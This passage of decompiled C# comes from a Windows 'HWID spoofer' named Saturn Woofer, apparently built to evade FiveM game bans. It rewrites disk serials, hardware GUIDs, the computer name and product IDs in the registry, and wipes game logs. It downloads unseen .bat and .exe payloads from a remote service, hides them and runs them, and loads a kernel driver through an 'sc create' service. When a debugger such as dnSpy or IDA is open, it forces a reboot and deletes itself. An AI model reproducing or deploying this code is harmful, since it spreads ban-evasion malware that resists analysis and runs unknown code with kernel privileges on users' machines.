    private void siticoneRoundedButton12_Click(object sender, EventArgs e)
    {
    }

    public static void InstallDate()
    {
      string date = Main.GenerateDate(8);
      RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true).SetValue(nameof (InstallDate), (object) date);
    }

    private void siticoneRoundedButton10_Click(object sender, EventArgs e)
    {
      Main.InstallDate();
      int num = (int) MessageBox.Show("Spoofed Last Logs ", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    private static void DimisProtection()
    {
      if (Process.GetProcessesByName("dnSpy").Length != 0)
      {
        Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
        {
          CreateNoWindow = true,
          UseShellExecute = false,
          ErrorDialog = false
        });
        Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
        Application.Exit();
      }
      if (Process.GetProcessesByName("ida64").Length != 0)
      {
        Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
        {
          CreateNoWindow = true,
          UseShellExecute = false,
          ErrorDialog = false
        });
        Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
        Application.Exit();
      }
      if (Process.GetProcessesByName("64dbg").Length != 0)
      {
        Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
        {
          CreateNoWindow = true,
          UseShellExecute = false,
          ErrorDialog = false
        });
        Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
        Application.Exit();
      }
      if (Process.GetProcessesByName("ollydbg").Length != 0)
      {
        Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
        {
          CreateNoWindow = true,
          UseShellExecute = false,
          ErrorDialog = false
        });
        Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
        Application.Exit();
      }
      if (Process.GetProcessesByName("x32dbg").Length != 0)
      {
        Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
        {
          CreateNoWindow = true,
          UseShellExecute = false,
          ErrorDialog = false
        });
        Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
        Application.Exit();
      }
      if (Process.GetProcessesByName("MasterDumper").Length == 0)
        return;
      Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
      {
        CreateNoWindow = true,
        UseShellExecute = false,
        ErrorDialog = false
      });
      Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
      Application.Exit();
    }

    private void siticoneRoundedButton14_Click(object sender, EventArgs e)
    {
      Main.NullSerials();
      Main.Kernel();
      if (System.IO.File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
      if (System.IO.File.Exists("C:\\Program Files\\Unlisted\\change.bat"))
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\change.bat");
      string text1 = ((TextBox) this.diskname).Text;
      string path1 = "C:\\Program Files\\Unlisted";
      if (!Directory.Exists(path1))
        Directory.CreateDirectory(path1);
      if (System.IO.File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
      {
        string path2 = "C:\\Program Files\\Unlisted\\change.bat";
        using (StreamWriter text2 = System.IO.File.CreateText(path2))
          text2.WriteLine("Volumeid.exe " + text1 + ": " + Main.DiskGen(4) + "-" + Main.DiskGen(4) + " -nobanner");
        Process process = new Process();
        process.StartInfo.FileName = path2;
        this.processlist.Add(process);
        System.IO.File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
        process.Start();
        int num = (int) MessageBox.Show("Spoofed NVME Disk!", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\change.bat");
        Directory.Delete(path1);
      }
      else
      {
        System.IO.File.WriteAllBytes("C:\\Program Files\\Unlisted\\Volumeid.exe", Saturn.Forms.Saturn.KeyAuthApp.download("558460"));
        System.IO.File.SetAttributes("C:\\Program Files\\Unlisted\\Volumeid.exe", FileAttributes.Hidden);
        Process.Start("C:\\Program Files\\Unlisted\\Volumeid.exe");
        Thread.Sleep(500);
        string path3 = "C:\\Program Files\\Unlisted\\change.bat";
        using (StreamWriter text3 = System.IO.File.CreateText(path3))
          text3.WriteLine("Volumeid.exe " + text1 + ": " + Main.DiskGen(4) + "-" + Main.DiskGen(4) + " -nobanner");
        Process process = new Process();
        process.StartInfo.FileName = path3;
        this.processlist.Add(process);
        System.IO.File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
        process.Start();
        int num = (int) MessageBox.Show("Spoofed NVME Disk!", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\change.bat");
        Directory.Delete(path1);
      }
    }

    private void premiumpanel_Paint(object sender, PaintEventArgs e)
    {
    }

    private void siticoneRoundedButton12_Click_1(object sender, EventArgs e)
    {
      Main.Kernel();
      int num = (int) MessageBox.Show("Spoofed Kernel Mode, Drivers Unloaded!", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    private void siticoneRoundedButton11_Click_1(object sender, EventArgs e)
    {
      foreach (string subKeyName1 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
      {
        foreach (string subKeyName2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1).GetSubKeyNames())
        {
          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1 + "\\" + subKeyName2 + "\\Target Id 0\\Logical Unit Id 0", true);
          if (registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral")
          {
            string s1 = Main.RandomId(14);
            string s2 = Main.RandomId(14);
            registryKey.SetValue("DeviceIdentifierPage", (object) Encoding.UTF8.GetBytes(s2));
            registryKey.SetValue("Identifier", (object) s1);
            registryKey.SetValue("InquiryData", (object) Encoding.UTF8.GetBytes(s1));
            registryKey.SetValue("SerialNumber", (object) s2);
          }
        }
      }
      foreach (string subKeyName in Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral").GetSubKeyNames())
        Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\" + subKeyName, true).SetValue("Identifier", (object) (Main.RandomId(8) + "-" + Main.RandomId(8) + "-A"));
      int num = (int) MessageBox.Show("Spoofed Nvme Disk!", "Saturn Woofer", MessageBoxButtons.OK);
    }

    private void siticoneRoundedButton19_Click(object sender, EventArgs e)
    {
      Main.NetWoof();
      Thread.Sleep(2500);
      int num = (int) MessageBox.Show("Spoofed Local netCache!", "Saturn Woofer", MessageBoxButtons.OK);
    }

    private void siticoneRoundedButton13_Click(object sender, EventArgs e)
    {
      string tempPath1 = Path.GetTempPath();
      byte[] bytes1 = Saturn.Forms.Saturn.KeyAuthApp.download("811372");
      System.IO.File.WriteAllBytes(tempPath1 + this.xynw + ".bat", bytes1);
      Process.Start(tempPath1 + this.xynw + ".bat");
      Thread.Sleep(2500);
      this.xynwbyzia();
      Main.NetWoof();
      if (System.IO.File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
      if (System.IO.File.Exists("C:\\Program Files\\Unlisted\\change.bat"))
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\change.bat");
      string text1 = ((TextBox) this.diskname).Text;
      string path1 = "C:\\Program Files\\Unlisted";
      if (!Directory.Exists(path1))
        Directory.CreateDirectory(path1);
      if (System.IO.File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
      {
        string path2 = "C:\\Program Files\\Unlisted\\change.bat";
        using (StreamWriter text2 = System.IO.File.CreateText(path2))
          text2.WriteLine("Volumeid.exe " + text1 + ": " + Main.DiskGen(4) + "-" + Main.DiskGen(4) + " -nobanner");
        Process process = new Process();
        process.StartInfo.FileName = path2;
        this.processlist.Add(process);
        System.IO.File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
        process.Start();
        int num = (int) MessageBox.Show("Spoofed NVME Disk!", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\change.bat");
        Directory.Delete(path1);
      }
      else
      {
        System.IO.File.WriteAllBytes("C:\\Program Files\\Unlisted\\Volumeid.exe", Saturn.Forms.Saturn.KeyAuthApp.download("558460"));
        System.IO.File.SetAttributes("C:\\Program Files\\Unlisted\\Volumeid.exe", FileAttributes.Hidden);
        Process.Start("C:\\Program Files\\Unlisted\\Volumeid.exe");
        Thread.Sleep(500);
        string path3 = "C:\\Program Files\\Unlisted\\change.bat";
        using (StreamWriter text3 = System.IO.File.CreateText(path3))
          text3.WriteLine("Volumeid.exe " + text1 + ": " + Main.DiskGen(4) + "-" + Main.DiskGen(4) + " -nobanner");
        Process process = new Process();
        process.StartInfo.FileName = path3;
        this.processlist.Add(process);
        System.IO.File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
        process.Start();
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\change.bat");
        Directory.Delete(path1);
      }
      Main.HWIDclick();
      string tempPath2 = Path.GetTempPath();
      byte[] bytes2 = Saturn.Forms.Saturn.KeyAuthApp.download("061044");
      System.IO.File.WriteAllBytes(tempPath2 + this.xynw + ".bat", bytes2);
      System.IO.File.SetAttributes(tempPath2 + this.xynw + ".bat", FileAttributes.Hidden);
      Process.Start(tempPath2 + this.xynw + ".bat");
      Thread.Sleep(2500);
      this.xynwbyzia();
      string path4 = "C:\\Program Files\\Win64";
      if (!Directory.Exists(path4))
        Directory.CreateDirectory(path4);
      if (System.IO.File.Exists("C:\\Program Files\\Win64\\net.bat"))
      {
        Process.Start("C:\\Program Files\\Win64\\net.bat");
      }
      else
      {
        string path5 = "C:\\Program Files\\Win64\\net.bat";
        using (StreamWriter text4 = System.IO.File.CreateText(path5))
          text4.WriteLine("netsh int ip reset");
        Process process = new Process();
        process.StartInfo.FileName = path5;
        this.processlist.Add(process);
        System.IO.File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
        process.Start();
      }
      Main.HWIDclick();
      Main.XBOXclick();
      Main.PCclick();
      Main.Diskclick();
      Main.FiveM();
      Main.New();
      Thread.Sleep(2000);
      int num1 = (int) MessageBox.Show("Spoofed FiveM Server Bans, Use new steam, rockstar and unlink discord (might need a vpn)", "Saturn Woofer", MessageBoxButtons.OK);
    }

    private void LogoutPanelButton_Click_1(object sender, EventArgs e) => ((Control) this.defpanel).BringToFront();

    private void siticoneButton2_Click(object sender, EventArgs e)
    {
      if (System.IO.File.Exists("C:\\Program Files\\saturn-user.txt"))
        System.IO.File.Delete("C:\\Program Files\\saturn-user.txt");
      if (System.IO.File.Exists("C:\\Program Files\\saturn-passwd.txt"))
        System.IO.File.Delete("C:\\Program Files\\saturn-passwd.txt");
      int num = (int) MessageBox.Show("Deleted Saved Logins!", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
    }

    private void siticoneRoundedButton7_Click_1(object sender, EventArgs e) => ((Control) this.defpanel).BringToFront();

    private void siticoneRoundedButton7_Click_2(object sender, EventArgs e)
    {
      string tempPath = Path.GetTempPath();
      byte[] bytes = Saturn.Forms.Saturn.KeyAuthApp.download("203677");
      System.IO.File.WriteAllBytes(tempPath + this.xynw + ".bat", bytes);
      System.IO.File.SetAttributes(tempPath + this.xynw + ".bat", FileAttributes.Hidden);
      Process.Start(tempPath + this.xynw + ".bat");
      Thread.Sleep(2500);
      this.xynwbyzia();
      int num = (int) MessageBox.Show("Spoofed Traces!", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    private void siticoneRoundedButton15_Click(object sender, EventArgs e)
    {
      Main.NullSerials();
      string tempPath = Path.GetTempPath();
      byte[] bytes = Saturn.Forms.Saturn.KeyAuthApp.download("061044");
      System.IO.File.WriteAllBytes(tempPath + this.xynw + ".bat", bytes);
      System.IO.File.SetAttributes(tempPath + this.xynw + ".bat", FileAttributes.Hidden);
      Process.Start(tempPath + this.xynw + ".bat");
      Thread.Sleep(2500);
      this.xynwbyzia();
      int num = (int) MessageBox.Show("Nulled System Serials!", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    private void siticoneOSToggleSwith1_CheckedChanged(object sender, EventArgs e)
    {
    }

    private void siticoneRoundedButton11_Click(object sender, EventArgs e)
    {
    }

    public static void NetWoof()
    {
      List<Process> processList = new List<Process>();
      string path1 = "C:\\Program Files\\Win64";
      if (!Directory.Exists(path1))
        Directory.CreateDirectory(path1);
      if (System.IO.File.Exists("C:\\Program Files\\Win64\\net.bat"))
      {
        Process.Start("C:\\Program Files\\Win64\\net.bat");
        System.IO.File.Delete("C:\\Program Files\\Win64\\net.bat");
      }
      else
      {
        string path2 = "C:\\Program Files\\Win64\\net.bat";
        using (StreamWriter text = System.IO.File.CreateText(path2))
          text.WriteLine("netsh int ip reset");
        Process process = new Process();
        process.StartInfo.FileName = path2;
        processList.Add(process);
        System.IO.File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
        process.Start();
        Thread.Sleep(500);
        System.IO.File.Delete("C:\\Program Files\\Win64\\net.bat");
      }
    }

    public static void HWIDclick()
    {
      string keyName = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001";
      string str1 = (string) Registry.GetValue(keyName, "HwProfileGuid", (object) "default");
      string str2 = "{Saturn-" + Main.GenID(5) + "-" + Main.GenID(5) + "-" + Main.GenID(4) + "-" + Main.GenID(9) + "}";
      Registry.SetValue(keyName, "GUID", (object) str2);
      Registry.SetValue(keyName, "HwProfileGuid", (object) str2);
    }

    public static void XBOXclick()
    {
      string date = Main.GenerateDate(8);
      RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true).SetValue("InstallDate", (object) date);
    }

    public static void IDclick()
    {
      string str = Main.GenerateString(5) + "-" + Main.GenerateString(5) + "-" + Main.GenerateString(5) + "-" + Main.GenerateString(5);
      RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
      registryKey.SetValue("ProductID", (object) str);
      registryKey.Close();
    }

    public static void PCclick()
    {
      RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", true);
      registryKey.SetValue("ComputerName", (object) ("DESKTOP-" + Main.GenerateString(6)));
      registryKey.Close();
    }

    public static void Diskclick()
    {
      foreach (string subKeyName1 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
      {
        foreach (string subKeyName2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1).GetSubKeyNames())
        {
          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1 + "\\" + subKeyName2 + "\\Target Id 0\\Logical Unit Id 0", true);
          if (registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral")
          {
            string s1 = Main.RandomId(14);
            string s2 = Main.RandomId(14);
            registryKey.SetValue("DeviceIdentifierPage", (object) Encoding.UTF8.GetBytes(s2));
            registryKey.SetValue("Identifier", (object) s1);
            registryKey.SetValue("InquiryData", (object) Encoding.UTF8.GetBytes(s1));
            registryKey.SetValue("SerialNumber", (object) s2);
          }
        }
      }
    }

    public static void FiveM()
    {
      string folderPath1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
      string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      if (Directory.Exists(folderPath1 + "\\DigitalEntitlements"))
        Directory.Delete(folderPath1 + "\\DigitalEntitlements", true);
      if (Directory.Exists(folderPath1 + "\\FiveM\\FiveM.app\\crashes"))
        Directory.Delete(folderPath1 + "\\FiveM\\FiveM.app\\crashes", true);
      if (Directory.Exists(folderPath1 + "\\FiveM\\FiveM.app\\logs"))
        Directory.Delete(folderPath1 + "\\FiveM\\FiveM.app\\logs", true);
      if (Directory.Exists(folderPath1 + "\\FiveM\\FiveM.app\\data\\cache"))
        Directory.Delete(folderPath1 + "\\FiveM\\FiveM.app\\data\\cache", true);
      Directory.Exists(folderPath1 + "\\FiveM\\FiveM.app\\data\\server-cache");
      if (!Directory.Exists(folderPath2 + "\\CitizenFX"))
        return;
      Directory.Delete(folderPath2 + "\\CitizenFX", true);
    }

    private static void New()
    {
      Main.ExecuteCommand("sc create Win32x64_0 binPath= C:\\Windows\\zxEsdMeYxazy.dat type= kernel");
      Thread.Sleep(600);
      Main.ExecuteCommand("sc start Win32x64_0");
      Main.ExecuteCommand("sc stop Win32x64_0");
      Main.ExecuteCommand("sc delete Win32x64_0");
      System.IO.File.Delete("C:\\Windows\\zxEsdMeYxazy.dat");
    }

    private static void ExecuteCommand(string command)
    {
      Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + command)
      {
        CreateNoWindow = true,
        UseShellExecute = false,
        RedirectStandardError = true,
        RedirectStandardOutput = true
      });
      process.WaitForExit();
      process.StandardOutput.ReadToEnd();
      process.StandardError.ReadToEnd();
      int exitCode = process.ExitCode;
      process.Close();
    }

    private void siticoneRoundedButton11_Click_2(object sender, EventArgs e)
    {
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "Append Completion", (object) "yes", RegistryValueKind.String);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "AutoSuggest", (object) "yes", RegistryValueKind.String);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", "EnableAutoTray", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Copy To", "", (object) "{C2FBB630-2971-11D1-A18C-00C04FD75D13}");
      Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Move To", "", (object) "{C2FBB631-2971-11D1-A18C-00C04FD75D13}");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "AutoEndTasks", (object) "1");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "HungAppTimeout", (object) "1000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", (object) "0");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WaitToKillAppTimeout", (object) "2000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "LowLevelHooksTimeout", (object) "1000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", (object) "0");
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLowDiskSpaceChecks", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "LinkResolveIgnoreLinkInfo", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveSearch", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveTrack", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoInternetOpenWith", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", (object) "2000");
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagsvc", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", (object) 1, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "GPU Priority", (object) 8, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Priority", (object) 6, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Scheduling Category", (object) "High", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "SFIO Priority", (object) "High", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "GPU Priority", (object) 0, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Priority", (object) 8, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Scheduling Category", (object) "Medium", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "SFIO Priority", (object) "High", RegistryValueKind.String);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("Append Completion", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("AutoSuggest", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", true).DeleteValue("EnableAutoTray", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", (object) "0", RegistryValueKind.DWord);
      Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Copy To", false);
      Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Move To", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("AutoEndTasks", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("HungAppTimeout", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("WaitToKillAppTimeout", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("LowLevelHooksTimeout", false);
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", (object) "400");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", (object) "400");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoLowDiskSpaceChecks", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("LinkResolveIgnoreLinkInfo", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveSearch", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveTrack", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoInternetOpenWith", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", (object) "5000");
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", (object) 14, RegistryValueKind.DWord);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("GPU Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Scheduling Category", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("SFIO Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("GPU Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Scheduling Category", false);
